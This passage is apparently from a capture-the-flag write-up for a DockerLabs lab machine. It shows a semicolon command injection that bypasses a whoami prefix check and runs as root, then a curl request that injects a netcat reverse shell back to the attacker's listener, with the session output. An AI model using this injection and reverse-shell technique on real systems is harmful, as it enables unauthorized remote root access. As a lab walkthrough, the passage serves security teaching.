We can bypass this with a semicolon and execute another command that's not inside of the list of allowed commands, something like this: ?exec=whoami;id because the python script are only checking the begin of the command if it starts with whoami.

Let's see if it works.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl -s 'http://localhost:25000?exec=whoami;id' -H 'Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo='
root
uid=0(root) gid=0(root) groups=0(root)
```

Great! let's do another reverse shell, let's open another netcat listener.

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
```

Now let's execute the command:

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ curl -s 'http://localhost:25000/?exec=whoami;nc%20172.17.0.1%202222%20-e%20/bin/sh' -H 'Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo='
```

if you don't know the parts that are %20 is the encoded format of a space in a url.

And we receive this:

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 52442
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
script /dev/null -c sh
Script started, output log file is '/dev/null'.
#
```

We are root now ***...pwned..!*** 
